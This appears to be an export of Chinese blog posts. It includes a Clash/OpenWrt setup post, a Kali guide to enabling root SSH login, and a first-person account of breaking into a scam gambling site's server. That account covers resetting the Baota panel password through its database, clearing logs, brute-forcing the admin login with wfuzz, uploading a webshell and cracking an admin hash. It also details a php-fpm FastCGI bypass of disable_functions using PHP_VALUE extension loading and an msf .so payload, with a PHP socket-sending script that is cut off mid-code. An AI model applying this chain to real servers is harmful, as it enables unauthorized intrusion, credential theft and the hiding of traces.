href="https://raw.githubusercontent.com/iadao/img/master/20200929141043.jpg#vwid=1964&vhei=1382"><img src="https://raw.githubusercontent.com/iadao/img/master/20200929141043.jpg#vwid=1964&vhei=1382" alt="-w982"></a>  -w982</li></ul><h3 id="规则设置"><a href="#规则设置" class="headerlink" title="规则设置"></a>规则设置</h3><p><a href="https://raw.githubusercontent.com/iadao/img/master/20200929141033.jpg#vwid=1704&vhei=452"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20200929141033.jpg#vwid=1704&vhei=452"><img src="https://raw.githubusercontent.com/iadao/img/master/20200929141033.jpg#vwid=1704&vhei=452" alt="-w852"></a></p><p>-w852</p><h3 id="第三方规则订阅"><a href="#第三方规则订阅" class="headerlink" title="第三方规则订阅"></a>第三方规则订阅</h3><p><a href="https://raw.githubusercontent.com/iadao/img/master/20200929141030.jpg#vwid=844&vhei=498"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20200929141030.jpg#vwid=844&vhei=498"><img src="https://raw.githubusercontent.com/iadao/img/master/20200929141030.jpg#vwid=844&vhei=498" alt="-w422"></a></p><p>-w422</p><h3 id="服务器与策略组"><a href="#服务器与策略组" class="headerlink" title="服务器与策略组"></a>服务器与策略组</h3><p><a href="https://raw.githubusercontent.com/iadao/img/master/20200929141036.jpg#vwid=1678&vhei=710"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20200929141036.jpg#vwid=1678&vhei=710"><img src="https://raw.githubusercontent.com/iadao/img/master/20200929141036.jpg#vwid=1678&vhei=710" alt="-w839"></a></p><p>-w839</p><h3 id="上传配置文件"><a href="#上传配置文件" class="headerlink" title="上传配置文件"></a>上传配置文件</h3><p>自行研究</p><p>保存配置并应用</p><h2 id="启动成功界面"><a href="#启动成功界面" class="headerlink" title="启动成功界面"></a>启动成功界面</h2><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144421.jpg#vwid=3264&vhei=1664"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144421.jpg#vwid=3264&vhei=1664"><img src="https://raw.githubusercontent.com/iadao/img/master/20211206144421.jpg#vwid=3264&vhei=1664"></a></p><h2 id="新功能展示"><a href="#新功能展示" class="headerlink" title="新功能展示"></a>新功能展示</h2><h3 id="流媒体解锁"><a href="#流媒体解锁" class="headerlink" title="流媒体解锁"></a>流媒体解锁</h3><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144417.jpg#vwid=1798&vhei=712"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144417.jpg#vwid=1798&vhei=712"><img src="https://raw.githubusercontent.com/iadao/img/master/20211206144417.jpg#vwid=1798&vhei=712"></a></p><h3 id="在线订阅转换"><a href="#在线订阅转换" class="headerlink" title="在线订阅转换"></a>在线订阅转换</h3><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144418.jpg#vwid=1276&vhei=822"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144418.jpg#vwid=1276&vhei=822"><img src="https://raw.githubusercontent.com/iadao/img/master/20211206144418.jpg#vwid=1276&vhei=822"></a></p><h3 id="更加简单的版本更新"><a href="#更加简单的版本更新" class="headerlink" title="更加简单的版本更新"></a>更加简单的版本更新</h3><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144416.jpg#vwid=3078&vhei=616"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144416.jpg#vwid=3078&vhei=616"><img src="https://raw.githubusercontent.com/iadao/img/master/20211206144416.jpg#vwid=3078&vhei=616"></a></p><h3 id="上传文件类型增加，如备份文件上传"><a href="#上传文件类型增加，如备份文件上传" class="headerlink" title="上传文件类型增加，如备份文件上传"></a>上传文件类型增加，如备份文件上传</h3><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144420.jpg#vwid=2806&vhei=490"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20211206144420.jpg#vwid=2806&vhei=490"><img src="https://raw.githubusercontent.com/iadao/img/master/20211206144420.jpg#vwid=2806&vhei=490"></a></p><h3 id="增加Meta内核"><a href="#增加Meta内核" class="headerlink" title="增加Meta内核"></a>增加Meta内核</h3><blockquote><p>介绍：<a href="https://adao.me/go/aHR0cHM6Ly9jbGFzaG1ldGEuZ2l0Ym9vay5pby9tZXRhLw==">https://clashmeta.gitbook.io/meta/</a></p></blockquote><p><a href="https://raw.githubusercontent.com/iadao/img/master/20220423185001.jpg#vwid=1370&vhei=980"></a></p><p><a href="https://raw.githubusercontent.com/iadao/img/master/20220423185001.jpg#vwid=1370&vhei=980"><img src="https://raw.githubusercontent.com/iadao/img/master/20220423185001.jpg#vwid=1370&vhei=980"></a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit openwrt Clash 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali手工开启ssh命令</title>
      <link href="/2024/09/27/qi-ta/kali-shou-gong-kai-qi-ssh-ming-ling/"/>
      <url>/2024/09/27/qi-ta/kali-shou-gong-kai-qi-ssh-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="插入一个kali添加新root的命令"><a href="#插入一个kali添加新root的命令" class="headerlink" title="插入一个kali添加新root的命令"></a>插入一个kali添加新root的命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">passwd</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325222259284-2063599498.png" alt="images"></p><p>首先使用netstat -lnt查看一下当前kali开放的端口，如果没有开放22端口，我们需要手动开启22端口。</p><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325221025800-1826562903.png" alt="images"> </p><h2 id="第一步：开启kail-远程ssh，开启办法如下："><a href="#第一步：开启kail-远程ssh，开启办法如下：" class="headerlink" title="第一步：开启kail 远程ssh，开启办法如下："></a>第一步：开启kail 远程ssh，开启办法如下：</h2><h3 id="配置SSH参数"><a href="#配置SSH参数" class="headerlink" title="配置SSH参数"></a>配置SSH参数</h3><p>修改sshd_config文件，命令为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325221217828-2053701535.png" alt="images"></p><p>将#PasswordAuthentication no的注释去掉，并且将NO修改为YES //kali中默认是yes</p><p>将PermitRootLogin without-password修改为PermitRootLogin yes</p><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325221419037-383768029.png" alt="images"></p><h2 id="第二步：启动SSH服务"><a href="#第二步：启动SSH服务" class="headerlink" title="第二步：启动SSH服务"></a>第二步：启动SSH服务</h2><p>命令为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/ssh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">ssh</span> start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325221624073-418461818.png" alt="images"></p><p>查看SSH服务状态是否正常运行，命令为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/ssh status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">ssh</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325221539972-418734645.png" alt="images"></p><h2 id="第三步：设置系统自动启动SSH服务"><a href="#第三步：设置系统自动启动SSH服务" class="headerlink" title="第三步：设置系统自动启动SSH服务"></a>第三步：设置系统自动启动SSH服务</h2><h3 id="系统自动启动SSH服务"><a href="#系统自动启动SSH服务" class="headerlink" title="系统自动启动SSH服务"></a>系统自动启动SSH服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">update-rc.d <span class="token function">ssh</span> <span class="token builtin class-name">enable</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325221730228-2086528238.png" alt="images"></p><h3 id="关闭系统自动启动SSH服务"><a href="#关闭系统自动启动SSH服务" class="headerlink" title="关闭系统自动启动SSH服务"></a>关闭系统自动启动SSH服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">update-rc.d <span class="token function">ssh</span> disabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次执行<strong>netstat -lnt</strong>命令则看到22端口成功启动</p><p><img src="https://img2022.cnblogs.com/blog/2786933/202203/2786933-20220325221820145-2130970474.png" alt="images"></p><p> 之后就可以通过xshell远程登陆了！</p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit 操作系统 Linux kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后记：菠菜站点的攻克之旅</title>
      <link href="/2024/09/27/qi-ta/hou-ji-bo-cai-zhan-dian-de-gong-ke-zhi-lu/"/>
      <url>/2024/09/27/qi-ta/hou-ji-bo-cai-zhan-dian-de-gong-ke-zhi-lu/</url>
      
        <content type="html"><![CDATA[<p>故事发生在上次事件（<a href="https://knightyun.github.io/2021/09/04/exploit-take-down-swindle-website">https://knightyun.github.io/2021/09/04/exploit-take-down-swindle-website</a>）之后，算是作为一个收尾，但也算是另一个开始 (⌐■_■)，顺便记录下相关操作；</p><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>上回故事说到，骗子服务器的最高权限虽然已经拿到，但这也只是技术层面的掌控，想要立案，需要提供尽量多的人员相关信息，如手机、银行卡等，但这些目前都并未采集到（前面虽然提到了某次源码有个银行账户，但后面发现那只是个测试号，百度出来一堆在用的…），所以还需要通过一些额外的手段去获取有用的信息；</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="宝塔后台"><a href="#宝塔后台" class="headerlink" title="宝塔后台"></a>宝塔后台</h3><p>首先想到的就是之前一直留着没进去的宝塔面板后台，里面应该会有些登录信息之类，但并没有得到登录密码，但这也并没有太大影响，因为现在可以直接访问宝塔的数据库文件（<code>panel/data/default.db</code>， <code>sqlite</code>数据库文件），所以直接进去备份个账户然后设置个密码，防止把正常账户挤下去：</p><p><img src="https://img-blog.csdnimg.cn/81f29b991e314d5f9ed76960f23510c1.png" alt="cmd-change-baota-password"></p><p><img src="https://img-blog.csdnimg.cn/b15aaf41f4cd4750951f44d9567df0dc.png" alt="cmd-baota-backup-user"></p><p>清理下日志，然后就是愉快的登录进去 ㄟ( ▔, ▔ )ㄏ：</p><p><img src="https://img-blog.csdnimg.cn/ca03db6028c443248e27457e1d5d289e.png" alt="front-baota-home"></p><p>首先看到的就是账户名，想是管理员的手机号，这里看不全，去设置里面瞅瞅：</p><p><img src="https://img-blog.csdnimg.cn/9db11a61cc194587a022d8cbd000b6f9.png" alt="front-baota-lookup-phone-elements"></p><p>这里也是中间四位打了星号，从源码里也看不出，但这些也都是纸老虎，因为随后审查发现一处接口请求数据，返回信息里是完整的手机号，微信搜了下也有这个这么个账户：</p><p><img src="https://img-blog.csdnimg.cn/d134ae727fac42de95ed87cd8e1c7bc1.jpg" alt="wechat-baota-phone"></p><p>但其真实性未知，多半只是个幌子，先记着吧；</p><h3 id="新起点"><a href="#新起点" class="headerlink" title="新起点"></a>新起点</h3><p>在之后某个时间点准备继续收集信息的时候，发现其域名甚至IP都无法再访问了，后面几天试了也都不行，感觉可能是收割完一波然受卷款跑路了；自然，除了一些信息，之前获取的所有权限，都化作泡影了；也是在这之后，警察蜀黍竟主动联系了过来（没有喝茶，俺是良民 $_$），由于想着再碰碰运气看看，结果有趣的事再次发生了，访问之前那个IP展示出了这么个页面：</p><p><img src="https://img-blog.csdnimg.cn/d8f9ea546024435eba4ca116e2cedacc.png" alt="front-user-login"></p><p>好吧得承认，那一瞬间确实差点信了这标题和图标，还浪费了三秒考虑渗透它的正当性，仔细想想也知道，真要是那家银行，怎么会把服务器放到有前科的IP身上，页面内容也说不过去，然后简单注册了个账号登录进去：</p><p><img src="https://img-blog.csdnimg.cn/5748918daa3740178ed3522b4dfba434.png" alt="front-user-home-1"></p><p><img src="https://img-blog.csdnimg.cn/4b565b7234184393934705798b2909a2.png" alt="front-user-home-2"></p><p><img src="https://img-blog.csdnimg.cn/4ae707f6cb484a0c9fde8e8ffbe2fc60.png" alt="front-user-home-3"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h3><p>=_= 好吧，来都来了，就是个顺手的事；下面的分析也印证了上面的猜想，这也算是个<strong>IP反查域名</strong> 的小技巧，因为正常的工具比如 <code>nslookup</code>, <code>dig</code> 只能从域名到IP进行解析（某些有 <code>ptr</code> 的除外），但是遇到这种有使用 <code>https</code> 的站点，如果没有限制IP直接访问的话，能够正常进入页面，并且在浏览器左上角点击协议名还能查看所使用的证书，正常的证书的“颁发给”的值就是站点的域名，这里显然不是，应该是个临时或者测试证书：</p><p><img src="https://img-blog.csdnimg.cn/1b16bc4d59144679bbdbe86d354aec68.png" alt="front-https-cert"></p><p>然后反过来对域名分析一波：</p><p><img src="https://img-blog.csdnimg.cn/86ef8c2ce42842689e9d270eb8156606.png" alt="cmd-nslookup-domain"></p><p>这里发现通过公共DNS解析出来的IP，和前面用的好像对不上号，细想下，应该就是使用了 <strong>CDN服务</strong>，这些IP对应的服务器都是提供服务的三方机构的，渗透没太大意义，并且也不容易，这里辛亏是直接通过源站IP进入的，不然要通过域名和CDN检索出源站还是另一项头疼的活儿；</p><p>那么有了域名就来扫一波子域名，获取潜在的关联站：</p><p><img src="https://img-blog.csdnimg.cn/cbd67639fbe84a738cb81cba2690a77a.png" alt="cmd-enum-subdomain"></p><p>还真有不少，先记着备用，随后从前台页面的返回数据里分析，发现这是一台使用 php 的 Linux 服务器，和之前的 Windows IIS 服务器不同，看来应该是域名被释放或转卖了，那么就从新扫波端口吧：</p><p><img src="https://img-blog.csdnimg.cn/b95ea3a4c8374611b56eefda1b98208d.png" alt="nmap-normal-scan"></p><p>还是发现了一些熟悉的身影，依旧先后台跑着密码先吧，按以往的经验，遇到精明的主也许有漏网之鱼，所以还需要贴心的整套全端口扫描服务：</p><p><img src="https://img-blog.csdnimg.cn/e9efa523745847cea4abf367afcb000e.png" alt="nmap-all-port-scan"></p><p>还确实有，看协议大概能猜到是什么服务，挨个试试，发现一个是 ssh 登录，一个宝塔后台：</p><p><img src="https://img-blog.csdnimg.cn/dccf69aff14e4a86a9380e5f81707858.png" alt="cmd-ssh-login"></p><p><img src="https://img-blog.csdnimg.cn/59859f554023465c9b3a1bf2ed494839.png" alt="front-bt-login"></p><p>宝塔依然有登录次数校验，爆破无望，只能先搁一边；</p><h3 id="后台目录"><a href="#后台目录" class="headerlink" title="后台目录"></a>后台目录</h3><p>这次都还没来得及用上目录爆破，手打了几个就盲猜了出来后台路径，倒也省工夫勒：</p><p><img src="https://img-blog.csdnimg.cn/75abb9e8ea0b4e4ab52b4a70d1071d23.png" alt="front-admin-login-jump"></p><p><img src="https://img-blog.csdnimg.cn/381d017dc4184844a9c04478ea72a15f.png" alt="front-admin-login"></p><p>双赢？不存在的，只会是单方面的 ╮（╯＿╰）╭，简单分析了会儿页面，这里就暂时不用祭出神器了，直接用 <strong><code>wfuzz</code></strong> 跑一波账户密码：</p><p><img src="https://img-blog.csdnimg.cn/ad46afa3696245aaa0e8d77cc77ebf03.png" alt="cmd-wfuzz-admin-login"></p><p>先放后台跑着，去其他地方转转；一会儿后就看到了结果，哟西！进去瞅瞅：</p><p><img src="https://img-blog.csdnimg.cn/a47c5b5f9d09417bba334e44e1a73ca2.png" alt="front-admin-home"></p><p><img src="https://img-blog.csdnimg.cn/78c556d7922f43128235ebcac9c04ff8.png" alt="front-admin-products"></p><p><img src="https://img-blog.csdnimg.cn/3c7a2f64c2634b82bc8dc9459b4cf216.png" alt="front-admin-user-bank"></p><p><img src="https://img-blog.csdnimg.cn/365404e506bb407898965c9829da8478.png" alt="front-admin-user-info"></p><p><img src="https://img-blog.csdnimg.cn/d9cec669f3b64104ae5401105e8f049a.png" alt="front-admin-user-charge"></p><p>麻雀虽小五脏俱全，然后也有一些预料中的有意思的东西：</p><p><img src="https://img-blog.csdnimg.cn/9c730179c46342b9ac90a9674b6288b2.png" alt="front-admin-user-withdraw"></p><p><img src="https://img-blog.csdnimg.cn/393f727eef7d4ae7b3a54f6d5b347f9d.png" alt="front-admin-risk-control"></p><p>提现那个就不说了，能否成功全看管理员心情，下面那个看不太明白也没关系，可能道理大家也都懂，反正就那么个意思，你的命运我掌控，你的风险我操纵 (¬‿¬)；</p><h3 id="Get-webshell"><a href="#Get-webshell" class="headerlink" title="Get webshell"></a>Get webshell</h3><p>后面花了点时间，分析了下页面找到一处可利用的漏洞，然后传个小玩意上去：</p><p><img src="https://img-blog.csdnimg.cn/96be97e42e77413294eb5d8a8bc822cd.png" alt="front-backdoor-phpinfo"></p><p>搞定，又到了亮剑的时刻：</p><p><img src="https://img-blog.csdnimg.cn/ebcdf2b0bec54770893970509f733cff.png" alt="ant-file-site-root"></p><p>往上遍历目录发现确实不简单，出现了之前的某些域名，难道是小站群，后面花了好一段时间才稍微搞懂他们的架构，多个二级域名指向当前IP，并拥有几个不同的CDN地址，然后某个二级域名又指向另一台服务器IP，当前IP的服务器呢又包含了另一个一级域名对应的二级域名，这几个站点又几乎在共享同一套代码，=_= 真够复杂的，难道是业务拓展导致的计划不周么，不过着也不重要，对应到服务器就行；</p><p><img src="https://img-blog.csdnimg.cn/8b17654b7157476b9525d4042adcd251.png" alt="ant-file-more-sites"></p><p>然后就是访问 <code>/etc/passwd</code> 文件查看用户，因为这个文件在 Linux 中是所有用户可访问：</p><p><img src="https://img-blog.csdnimg.cn/c10d2afeb7184069ab55931d85b01c2f.png" alt="ant-file-passwd"></p><p>都是些默认账户，由于当前是 www 账户，所以是没有访问 <code>/etc/shadow</code> 文件的权限的，这个文件记录的是系统所有账户的密码的 hash 值，所以后面步骤就是提权了；</p><p>在浏览系统目录的时候，发现了 <code>phpMyAdmin</code> 的登录地址，难怪之前没扫出，应该是宝塔里配置过，生成随机的复杂路径来校验访问入口：</p><p><img src="https://img-blog.csdnimg.cn/4e74296da8c64bf688c1f444f1b7bfe7.png" alt="ant-file-pma-path"></p><p><img src="https://img-blog.csdnimg.cn/b753058cba7c418e95479f70d80b81af.png" alt="front-pma-login"></p><p>账户和密码就简单了，可通过某些手段获取，只是可惜对方并不是配置的 root 账户，而是一个子账户，用站点命名，应该是服务器有多站点的缘故，权限也不高，先登录进去看下：</p><p><img src="https://img-blog.csdnimg.cn/36dcffcdd69245c9890d1e56d2e18879.png" alt="front-pma-home"></p><p>内部包含的是站点前后台的一些数据，先找下有用的信息：</p><p><img src="https://img-blog.csdnimg.cn/8743f2ed769e4590931dd5719865afa8.png" alt="front-pma-databases"></p><p><img src="https://img-blog.csdnimg.cn/5e8d4f4da2144d689ba5c0db293f2499.png" alt="front-pma-admin-pass-hash"></p><p>有个表存的管理员的信息，额这个表名（<code>bulamao</code>）……难道又要开始考验我对博大的中国文化熟悉程度了吗，我认输了，有知道的小伙伴可以评论下；表里面有串密码的哈希值，先拿去查一下碰碰运气：</p><p><img src="https://img-blog.csdnimg.cn/57730a979edc4fedb5225cb8e218c3d9.png" alt="front-pma-admin-pass-text"></p><p>居然还真有，小本本记下（后面确实为进入其他站点提供了依据）；</p><h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>浏览目录的时候也发现了一些精致的小玩意：</p><p><img src="https://img-blog.csdnimg.cn/4b2f11c67e4d4fc094ced7f9ed078e57.png" alt="ant-file-backdoors"></p><p><img src="https://img-blog.csdnimg.cn/7f1411ceef75461cad4b27a5536001d1.png" alt="ant-code-backdoor-abcd-passwd"></p><p><img src="https://img-blog.csdnimg.cn/62baa5af9517448e9f9cbf36f6f3d4de.png" alt="front-backdoor-abcd-login"></p><p><img src="https://img-blog.csdnimg.cn/949424f41fae4a80966bf168452b1f51.png" alt="front-backdoor-abcd-home"></p><p><img src="https://img-blog.csdnimg.cn/0dbfd0f29069403b8015939c0c604b99.png" alt="front-backdoor-adminer"></p><p><img src="https://img-blog.csdnimg.cn/9051041333c340a7b51cb049d38770c8.png" alt="front-backdoor-file-manage"></p><p>地方不大，还挺热闹，对面都是大佬惹不起，似乎还有好几拨人，让它们安静的躺着，相爱相杀吧，俺啥都没看见 (x_x)；</p><h3 id="disable-functions-绕过"><a href="#disable-functions-绕过" class="headerlink" title="disable_functions 绕过"></a>disable_functions 绕过</h3><p>本来是准备打开虚拟终端愉快的研究如何提权的，结果开幕雷击：</p><p><img src="https://img-blog.csdnimg.cn/b7153249131044819d0403c80f94fff7.png" alt="ant-shell-error"></p><p>不用说，多半一些系统执行函数被禁用了，就是 php 配置项中的 <strong><code>disable_functions</code></strong> 值，用于限制能在 php 脚本中执行系统命令的一些函数，当然也存在一些漏洞导致的绕过方法，途径不少，节约时间，就不挨个手工测试了，直接用现有的集成插件：</p><p><img src="https://img-blog.csdnimg.cn/2ad6ef0ff5114c43a35ce0d929386d45.png" alt="ant-plugin-disable-functions-menu"></p><p><img src="https://img-blog.csdnimg.cn/1fd4b5cf158d48ca9ff8748b855af257.png" alt="ant-plugin-disable-fun-1"></p><p>看到 <code>putenv</code> 被禁用心就凉了半截，光这就能劝退大部分绕过方式了，不过还是得试试，因为还剩一个方法可用（<code>php-fpm</code>），通过查看系统配置文件发现，fpm 模块使用的 <code>socket</code> 通信方式，配置一下然后启动：</p><p><img src="https://img-blog.csdnimg.cn/0463ebcea0da4840aa4d3ba6847e1fb7.png" alt="ant-plugin-disable-fun-2"></p><p><img src="https://img-blog.csdnimg.cn/5983168ce72645fba62bf4ff9acf8df9.png" alt="ant-plugin-disable-fun-3"></p><p><img src="https://img-blog.csdnimg.cn/3ea800d6a3374433b901ab247199062f.png" alt="ant-plugin-disable-fun-start"></p><p>最后提示都是成功，检查其生成的动态链接库文件也是成功上传的，但终端始终无法开启，一直提示返回数据为空，起始以为是插件用的某个函数也被 php 给禁用了导致返回为空，也找到不其他可利用的漏洞，为此还卡了大半周的时间，后来准备查查资料，手动把利用方法实现一遍；</p><p>其实该方法的原理大致就是：php 是一门动态语言，但 <code>nginx</code> 是无法处理这些的，所以中间还有个 <code>fastcgi</code> 协议在牵线搭桥，可类比 <code>HTTP</code> 协议，nginx 将接受到的客户端请求转换成 fastcgi 协议格式的数据，而 php 模块中的 <code>php-fpm</code> 就是用来处理这些 fastcgi 协议数据的，然后再传给 php 解释器去处理，完成后结果数据又以之前同样的路径返回到浏览器客户端；所以一般在 Linux 服务器上启动 php 程序，都会启动一个叫 php-fpm 的服务，一般会监听本机的 <code>9000</code> 端口，或者套接字文件，nginx 的配置文件 fastcgi 访问地址也配成这个端口或文件，这些都是为了完成上述通信过程；</p><p>这里面可<strong>利用</strong>的点就是，绕过通往 nginx 的请求，直接与 php-fpm 服务沟通，理想情况就是由于配置失误导致 9000 监听在了外网接口而不是本机接口，当然这种情况也是极少数，但这也并不意味着监听本机就无法利用了，在 php 程序文件可写的前提下，可以在程序中通过 <code>curl</code> 接口向服务器本机 9000 端口发起请求（或 <code>stream_socket_client</code> 发起套接字文件通信请求），并且是模仿 fastcgi 客户端发送对应格式的数据，这样就能实现绕过 nginx 直接与 php-fpm 沟通；这种操作还有另一种说法，叫 <strong>SSRF</strong>（<code>Server-Side Request Forgery</code>），即<strong>服务端请求伪造</strong>，通过服务器去实现访问客户端正常不能访问到的内网资源；当然还有一个和他名字很像的手段： <strong>CSRF</strong>（<code>Cross-Site Request Forgery</code>，跨站请求伪造），只不过这个是盗用其他客户端的登录凭证；</p><p>可能这里还有个问题，这样绕了一圈去建立通信，最后不是还是会通过 php-fpm 吗，这样配置的函数限制依然存在，其实不然，直接和 php-fpm 沟通的话，它是支持<strong>修改</strong> php 配置的，就是 fastcgi 协议中的 <code>PHP_VALUE</code>, <code>PHP_ADMIN_VALUE</code> 这两个参数，比如可以设置这两个配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"PHP_VALUE"</span><span class="token builtin class-name">:</span> <span class="token string">"auto_prepend_file = php://input"</span><span class="token string">"PHP_ADMIN_VALUE"</span><span class="token builtin class-name">:</span> <span class="token string">"allow_url_include = On"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这会导致执行 php 程序之前包含 <code>HTTP</code> 中 <code>POST</code> 的数据，实现任意代码执行的目的，但即使这样也还是不行，因为这里的任意代码执行依然逃不开 php 配置文件的控制，所以就还需要更进一层，可以利用 <code>extension</code> 这个环境变量，设置执行脚本是要引入的动态链接库文件（Linux 下是 <code>.so</code>，Windows 下是 <code>.dll</code>）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"PHP_VALUE"</span><span class="token builtin class-name">:</span> <span class="token string">"extension = /xxx/xxx.so"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就需要有任意文件上传权限，不过都开始研究限制绕过了，这点权限是肯定有的，然后就是编译构造自己的 <code>.so</code> 文件，并向其中添加要执行的系统命令，这样链接库文件在被引入的时候就会执行预定的命令，同时也不受 php 配置文件的限制；这个sao操作也是在研究那个插件代码时发现的 (¬‿¬)，同时也通过抓包找到了之前一直返回空数据的原因：</p><p><img src="https://img-blog.csdnimg.cn/8d4b636ac71446e59ab5d8b90e6b03ab.png" alt="fiddler-ant-fpm-request"></p><p>原来插件一直在站点根目录读取配置的后门程序，之前为了掩人耳目是塞到了一个隐蔽的深层目录，所以一直获取不到数据返回空，也算是自己的配置失误，就是这里需要配置为后门程序所在目录：</p><p><img src="https://img-blog.csdnimg.cn/d3794fd917964e3da0960c116943738b.png" alt="ant-plugin-disable-fun-4"></p><h3 id="远程指令执行"><a href="#远程指令执行" class="headerlink" title="远程指令执行"></a>远程指令执行</h3><p>目前虽然可以通过插件绕过 disable_functions 并正常使用虚拟终端，但后续并不打算这么做，插件的机理其实就是通过包含 <code>.so</code> 时执行里面插入的指令，查看生成的 <code>.so</code> 文件可以看到插入了这样一条命令：</p><p><img src="https://img-blog.csdnimg.cn/cc01eda30e2443dabc4f283ed5a3fa64.png" alt="cmd-hexedit-ant-so"></p><p>其实就是利用远程指令执行运行了另一个 php 服务，自定义了端口，并且 <code>-n</code> 参数是不使用 php 配置文件的意思，这样就实现了绕过 <code>disable_functions</code>，方便让其他程序畅通无阻的运行虚拟终端，手段确实有趣，不过这里就大可不必了，都能执行命令了还要虚拟终端干啥，另外经过测试也发现这样连接有一定时效性，大概一分钟左右就会断开连接，原因未知，所以为了后续更愉快的玩耍，直接上 <code>msf payload</code>，生成 <code>elf-so</code> 格式的文件后上传站点，然后把自定义的 fastcgi 客户端(<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a>)参数改下，让包含的 <code>.so</code> 文件为我们的 <code>payload</code> 文件以使其运行：</p><p><img src="https://img-blog.csdnimg.cn/11349adc0f404953aae8846927fefef9.png" alt="cmd-edit-fpm-py"></p><p>运行后就会得到构造后的 <code>fastcgi</code> 协议数据（TCP数据流），让服务器 php 发送它就好，所以还需要服务端写个 php 程序来配合发送，这是使用使用套接字文件通信时的文件内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"On"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///tmp/php-cgi-56.sock"</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Errno: "</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)&lt;br />\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span 